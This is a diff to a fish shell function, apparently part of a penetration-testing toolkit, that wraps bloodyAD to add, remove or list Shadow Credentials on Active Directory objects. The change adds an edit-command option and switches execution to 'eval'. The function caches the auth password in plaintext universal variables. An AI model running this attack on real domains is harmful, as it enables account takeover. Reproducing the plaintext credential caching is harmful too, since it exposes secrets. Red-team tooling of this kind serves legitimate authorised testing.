@@ -1,11 +1,6 @@
 # description: Shadow Credentials attack (KeyCredentialLink)
 function __kronos_shadow_credentials --description "Shadow Credentials attack (KeyCredentialLink)"
-    set -l wizard 0
-    if test (count $argv) -eq 0
-        set wizard 1
-    end
-
-    argparse h/help q/quiet u/username= p/password= k/kerberos t/target-object= a/action= w/wizard -- $argv
+    argparse h/help q/quiet X/edit-cmd u/username= p/password= k/kerberos t/target-object= a/action= w/wizard -- $argv
     or return 1
 
     if set -q _flag_help
@@ -19,6 +14,7 @@ function __kronos_shadow_credentials --description "Shadow Credentials attack (K
         echo "  -u, --username USER      Auth username"
         echo "  -p, --password PASS      Auth password"
         echo "  -k, --kerberos           Use Kerberos authentication"
+        echo "  -X, --edit-cmd           Edit command in your editor before execution"
         echo "  -q, --quiet              Skip prompts and use fallbacks/cached values"
         echo "  -h, --help               Show this help message"
         return 0
@@ -30,7 +26,7 @@ function __kronos_shadow_credentials --description "Shadow Credentials attack (K
     set -l auth_user $_flag_username
     set -l auth_pass $_flag_password
 
-    # Load defaults
+    # Base fallbacks to ensure variables are populated for confirmation or execution
     if test -z "$target"
         set target $__KRONOS_CACHE_SHADOW_TARGET
         if test -z "$target"; set target $TGT_DC_IP; end
@@ -53,23 +49,25 @@ function __kronos_shadow_credentials --description "Shadow Credentials attack (K
     end
 
     if not set -q _flag_quiet
-        set_color cyan; echo "[*] Starting Shadow Credentials wizard..."; set_color normal
+        if set -q _flag_wizard; or test -z "$argv[1]"
+            set_color cyan; echo "[*] Starting Shadow Credentials wizard..."; set_color normal
 
-        set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
-        set -U __KRONOS_CACHE_SHADOW_TARGET "$target"
+            set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
+            set -U __KRONOS_CACHE_SHADOW_TARGET "$target"
 
-        set target_obj (__kronos_ask "Target Object (e.g. web01\$)" "$target_obj"); or return 1
-        set -U __KRONOS_CACHE_SHADOW_OBJ "$target_obj"
+            set target_obj (__kronos_ask "Target Object (e.g. web01\$)" "$target_obj"); or return 1
+            set -U __KRONOS_CACHE_SHADOW_OBJ "$target_obj"
 
-        set action (__kronos_ask_choice "Action" "$action" add remove list); or return 1
-        set -U __KRONOS_CACHE_SHADOW_ACTION "$action"
+            set action (__kronos_ask_choice "Action" "$action" add remove list); or return 1
+            set -U __KRONOS_CACHE_SHADOW_ACTION "$action"
 
-        if not set -q _flag_kerberos
-            set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
-            set -U __KRONOS_CACHE_SHADOW_AUTH_USER "$auth_user"
+            if not set -q _flag_kerberos
+                set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
+                set -U __KRONOS_CACHE_SHADOW_AUTH_USER "$auth_user"
 
-            set auth_pass (__kronos_ask "Auth Password" "$auth_pass"); or return 1
-            set -U __KRONOS_CACHE_SHADOW_AUTH_PASS "$auth_pass"
+                set auth_pass (__kronos_ask "Auth Password" "$auth_pass"); or return 1
+                set -U __KRONOS_CACHE_SHADOW_AUTH_PASS "$auth_pass"
+            end
         end
 
         # Confirmation
@@ -95,21 +93,27 @@ function __kronos_shadow_credentials --description "Shadow Credentials attack (K
         return 1
     end
 
-    set -l cmd_str bloodyAD --host "$target" -d "$domain"
+    set -l cmd_list bloodyAD --host "$target" -d "$domain"
     if set -q _flag_kerberos
-        set -a cmd_str -k
+        set -a cmd_list -k
     else
         if test -z "$auth_user"
             echo "error: auth credentials required" >&2
             return 1
         end
-        set -a cmd_str -u "$auth_user" -p "$auth_pass"
+        set -a cmd_list -u "$auth_user" -p "$auth_pass"
     end
 
-    set -a cmd_str $action shadowCredentials "$target_obj"
+    set -a cmd_list $action shadowCredentials "$target_obj"
+    
+    set -l cmd_str (string escape -- $cmd_list | string join " ")
+    
+    if set -q _flag_edit_cmd
+        set cmd_str (__kronos_edit_cmd "$cmd_str"); or return 1
+    end
 
     __kronos_check_dep bloodyAD; or return 1
 
     echo "[*] Performing Shadow Credentials $action on $target_obj via bloodyAD..."
-    command $cmd_str
+    eval $cmd_str
 end
